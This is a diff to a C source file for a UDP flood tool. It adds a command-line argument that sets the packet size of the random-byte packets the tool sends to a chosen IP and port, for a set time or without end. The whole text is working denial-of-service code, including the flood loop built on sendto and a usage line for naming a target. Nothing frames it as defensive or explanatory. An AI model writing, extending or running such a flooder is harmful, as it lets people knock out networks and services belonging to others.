@@ -9,9 +9,7 @@
 #include <time.h>
 #include <unistd.h>
 
-#define PACKET_SIZE 25000
-
-void udp_flood(const char *ip, int port, int duration) {
+void udp_flood(const char *ip, int port, int duration, int packet_size) {
     bool random_port = (port == 0);
 
     printf("Attacking: %s:%d for %d seconds\n", ip, port, duration);
@@ -26,8 +24,8 @@ void udp_flood(const char *ip, int port, int duration) {
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_addr.s_addr = inet_addr(ip);
 
-    unsigned char bytes[PACKET_SIZE];
-    for (int i = 0; i < PACKET_SIZE; ++i) {
+    unsigned char bytes[packet_size];
+    for (int i = 0; i < packet_size; ++i) {
         bytes[i] = rand() % 256;
     }
 
@@ -40,7 +38,7 @@ void udp_flood(const char *ip, int port, int duration) {
         }
         dest_addr.sin_port = htons(port);
 
-        sendto(sock, bytes, PACKET_SIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        sendto(sock, bytes, packet_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
 
         if (duration > 0 && time(NULL) >= end_time) {
             break;
@@ -52,16 +50,17 @@ void udp_flood(const char *ip, int port, int duration) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        fprintf(stderr, "Usage: %s ip port(0=random) duration(0=forever)\n", argv[0]);
+    if (argc != 5) {
+        fprintf(stderr, "Usage: %s ip port(0=random) duration(0=forever) packet_size\n", argv[0]);
         exit(1);
     }
 
     const char *ip = argv[1];
     int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
+    int packet_size = atoi(argv[4]);
 
-    udp_flood(ip, port, duration);
+    udp_flood(ip, port, duration, packet_size);
 
     return 0;
 }
